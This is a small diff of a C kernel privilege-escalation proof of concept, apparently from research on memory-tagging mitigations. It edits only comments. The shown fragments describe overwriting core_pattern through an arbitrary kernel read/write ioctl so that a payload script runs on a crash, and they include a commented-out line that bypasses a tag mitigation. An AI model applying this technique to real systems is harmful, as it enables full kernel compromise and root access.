@@ -1,4 +1,4 @@
-// FZY: Add a simple privilege escalation proof of concept that overwrites the core_pattern to execute a payload script on crash
+// SDP: Add a simple privilege escalation proof of concept that overwrites the core_pattern to execute a payload script on crash
 
 #include <fcntl.h>
 #include <stdio.h>
@@ -21,7 +21,7 @@ struct arb_request {
 #define ARB_READ _IOR('A', 1, struct arb_request)
 #define ARB_WRITE _IOW('A', 2, struct arb_request)
 
-// FZY: Tagged read/write via ld_sdp_000/sd_sdp_000 (fixed, mismatching TTag).
+// Tagged read/write via ld_sdp_000/sd_sdp_000 (fixed, mismatching TTag).
 struct arb_tagged_request {
   unsigned long addr;     // Kernel address to access
   unsigned long value;    // Store: value to write; Load: filled with the result
@@ -236,7 +236,7 @@ int main(int argc, char *argv[]) {
 
     printf("[+] core_pattern address from kernel memory: 0x%lx\n", core_pattern_addr);
 
-    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
+    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
     // core_pattern_addr = core_pattern_addr | 0xFFFF000000000000;
   }
   
